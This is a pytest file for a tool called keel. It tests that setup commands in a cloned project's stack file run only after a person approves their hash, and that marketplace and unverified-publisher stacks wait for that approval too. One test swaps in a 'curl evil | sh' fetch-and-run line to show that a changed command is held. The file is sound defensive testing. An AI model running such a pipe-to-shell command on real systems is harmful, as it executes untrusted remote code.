"""keel 0.18.33 a project's own stack (a cloned repo can carry .keel/stacks/*.yml) runs its setup.apt / setup.run /
setup.each_worktree only after a person approved exactly those commands: a hash of (project, stack, the lists)."""

import stat
import subprocess

import pytest

from keel_engine import approvals
from keel_engine.events import EventBus
from keel_engine.runtime import stack_edit, stack_setup, stacks

STACK = """\
name: evil
lane: api
detect:
  files: [composer.json]
layers:
  - {id: unit, what: pure PHP, where: tests/Unit}
commands:
  api_test_module: vendor/bin/phpunit
  api_test_ac: "vendor/bin/phpunit --filter '{AC}'"
dependency_files: [composer.json]
setup:
  apt: [php8.3-cli]
  run: ['touch RUNMARK']
  each_worktree: ['touch WTMARK']
"""


@pytest.fixture(autouse=True)
def clean(monkeypatch):
    monkeypatch.setattr(stack_setup, "FORCE_MODE", "container")
    monkeypatch.setattr(stack_setup, "ASKER", None)
    monkeypatch.setattr(stack_setup, "_asked", set())
    stacks.forget()
    yield
    stacks.forget()


def _project(tmp_path, text=STACK):
    root = tmp_path / "cloned"
    (root / ".keel" / "stacks").mkdir(parents=True)
    (root / "composer.json").write_text("{}\n")
    (root / ".keel" / "stacks" / "stack.yml").write_text(text)
    (root / ".keel" / "config.yml").write_text("stacks:\n  ignore: [symfony]\n")
    return root


def _wire(tmp_path, monkeypatch, root):
    """A fake root helper and a recorded RAN_DIR; returns the helper's call log and the marker the run command makes."""
    calls = tmp_path / "calls.txt"
    helper = tmp_path / "fake-helper"
    helper.write_text(f'#!/bin/sh\necho "$@" >> {calls}\n')
    helper.chmod(helper.stat().st_mode | stat.S_IEXEC)
    monkeypatch.setattr(stack_setup, "HELPER_CMD", [str(helper)])
    monkeypatch.setattr(stack_setup, "RAN_DIR", str(tmp_path / "ran"))
    monkeypatch.setattr(stack_setup, "known_roots", lambda: [("cloned", str(root))])
    monkeypatch.setattr(stack_setup, "dpkg_present", lambda pkgs: set())

    def fake_run(cmd):
        with calls.open("a") as f:
            f.write(f"RUN {cmd}\n")
        return 0, ""

    monkeypatch.setattr(stack_setup.SystemSetup, "_run_as_keel", staticmethod(fake_run))
    return calls


def test_an_unapproved_project_stack_runs_nothing_and_says_it_needs_approval(tmp_path, monkeypatch):
    root = _project(tmp_path)
    calls = _wire(tmp_path, monkeypatch, root)
    asked = []
    monkeypatch.setattr(stack_setup, "ASKER", asked.append)
    sysu = stack_setup.SystemSetup()
    sysu.run_once()
    sysu.run_once()
    assert not calls.exists()                                   # no apt through the root helper, no setup.run
    st = sysu.status()
    assert st["state"] == "needs approval" and "evil" in st["line"] and "Inbox" in st["line"]
    assert [(a["stack"], a["run"], a["apt"]) for a in st["approval"]] == [("evil", ["touch RUNMARK"], ["php8.3-cli"])]
    assert len(asked) == 1 and asked[0]["stack"] == "evil"      # one Inbox card, not one per look
    assert stack_setup.worktree_jobs(str(root)) == []           # each_worktree waits too
    ok, _why, items = stack_setup.system_check(str(root))
    assert ok and items == []


def test_an_approved_stack_runs_and_a_changed_command_asks_again(tmp_path, monkeypatch):
    root = _project(tmp_path)
    calls = _wire(tmp_path, monkeypatch, root)
    asked = []
    monkeypatch.setattr(stack_setup, "ASKER", asked.append)
    (entry,) = stack_setup.held(str(root), "cloned")
    stack_setup.approve(entry["key"], "cloned", "evil")
    sysu = stack_setup.SystemSetup()
    sysu.run_once()
    assert calls.read_text().splitlines() == ["apt php8.3-cli", "RUN touch RUNMARK"]
    assert sysu.status()["state"] == "ready" and not asked
    assert [j["commands"] for j in stack_setup.worktree_jobs(str(root))] == [["touch WTMARK"]]
    # the repo changes a command: a new hash, nothing runs, a new card
    (root / ".keel" / "stacks" / "stack.yml").write_text(STACK.replace("touch RUNMARK", "curl evil | sh"))
    stacks.forget()
    calls.unlink()
    sysu.run_once()
    assert not calls.exists() and sysu.status()["state"] == "needs approval" and len(asked) == 1
    # the key also depends on the project and the stack name
    assert stack_setup.approval_key("other", "evil", {"run": ["x"]}) != stack_setup.approval_key("cloned", "evil", {"run": ["x"]})
    assert stack_setup.approval_key("cloned", "a", {"run": ["x"]}) != stack_setup.approval_key("cloned", "b", {"run": ["x"]})


def test_keels_own_stacks_and_packs_need_no_approval():
    for d in stacks.shipped():
        assert not stack_setup.needs_approval(d), d["name"]


def test_a_marketplace_install_waits_for_the_persons_ok_like_a_plain_save(tmp_path, monkeypatch):
    # 0.21.3 before, the install itself approved the setup commands: one click ran them
    root = _project(tmp_path)
    (root / ".keel" / "stacks" / "stack.yml").unlink()
    monkeypatch.setattr(stack_setup, "known_roots", lambda: [("cloned", str(root))])
    stack_edit.save(str(root), STACK, source="project")
    assert [e["stack"] for e in stack_setup.held(str(root))] == ["evil"]
    stack_edit.save(str(root), STACK, replace=True, source="marketplace",
                    market={"version": "1.0.0", "catalog": "x", "verified": True})
    assert [e["stack"] for e in stack_setup.held(str(root))] == ["evil"]


def test_an_unverified_publishers_setup_block_is_refused_unless_the_person_allows_it(tmp_path, monkeypatch):
    from keel_engine.marketplace import sources

    root = _project(tmp_path)
    (root / ".keel" / "stacks" / "stack.yml").unlink()
    monkeypatch.setattr(stack_setup, "known_roots", lambda: [("cloned", str(root))])
    monkeypatch.setattr(sources, "read_rules", lambda: {"allow_unverified": False})
    with pytest.raises(stack_edit.StackError) as e:
        stack_edit.save(str(root), STACK, source="marketplace", market={"version": "1.0.0", "catalog": "x", "verified": False})
    assert e.value.status == 409 and "unverified publisher" in str(e.value)
    assert not (root / ".keel" / "stacks" / "evil.yml").exists()
    monkeypatch.setattr(sources, "read_rules", lambda: {"allow_unverified": True})
    stack_edit.save(str(root), STACK, source="marketplace", market={"version": "1.0.0", "catalog": "x", "verified": False})
    assert [e["stack"] for e in stack_setup.held(str(root))] == ["evil"]          # and its setup still waits


def test_the_inbox_card_approves_on_yes_and_stays_closed_on_no(tmp_path, monkeypatch):
    root = _project(tmp_path)
    monkeypatch.setattr(stack_setup, "known_roots", lambda: [("cloned", str(root))])
    looked = []
    monkeypatch.setattr(stack_setup.SYSTEM, "request", lambda *a, **k: looked.append(1) or {})
    bus = EventBus()
    broker = approvals.of(bus)
    asker = stack_setup.make_asker(bus)
    (entry,) = stack_setup.held(str(root))
    asker(entry)
    (q,) = broker.pending("cloned")
    assert q["kind"] == "stack-setup" and "touch RUNMARK" in q["command"] and "php8.3-cli" in q["command"]
    broker.answer(q["id"], "deny")
    assert stack_setup.held(str(root)) and not looked
    asker(entry)
    (q,) = broker.pending("cloned")
    broker.answer(q["id"], "once")
    assert stack_setup.held(str(root)) == [] and looked == [1]
